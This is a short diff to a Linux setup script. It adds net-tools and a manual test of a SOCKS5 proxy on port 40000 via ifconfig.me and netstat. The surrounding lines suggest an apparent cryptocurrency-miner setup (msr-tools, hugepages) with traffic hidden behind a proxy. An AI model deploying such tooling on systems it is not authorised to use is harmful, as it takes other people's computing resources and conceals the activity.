@@ -69,7 +69,7 @@ run_setup() {
         sed -i "s/#\$nrconf{restart} = 'i';/\$nrconf{restart} = 'a';/g" /etc/needrestart/needrestart.conf >/dev/null 2>&1
     fi
 	
-	DEBIAN_FRONTEND=noninteractive apt update >/dev/null;apt-get install -y --no-install-recommends tzdata wget git curl psmisc kmod msr-tools cmake build-essential binutils procps >/dev/null
+	DEBIAN_FRONTEND=noninteractive apt update >/dev/null;apt-get install -y --no-install-recommends tzdata wget git curl psmisc kmod msr-tools cmake build-essential binutils procps net-tools >/dev/null
 	ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime > /dev/null
     dpkg-reconfigure --frontend noninteractive tzdata > /dev/null
 
@@ -118,6 +118,11 @@ run_setup() {
 	sleep 5
     echo "✅ NETWORK SECURE. IP: $CURRENT_IP"
 	sleep 2
+	echo "Manually testing socks5 at port 40000" 
+	curl -s -x socks5h://127.0.0.1:40000 ifconfig.me
+	echo ""
+	sleep 2
+	netstat -ntlp
 	echo "Setting up PH"
 	sysctl -w vm.nr_hugepages=512
 	sleep 2
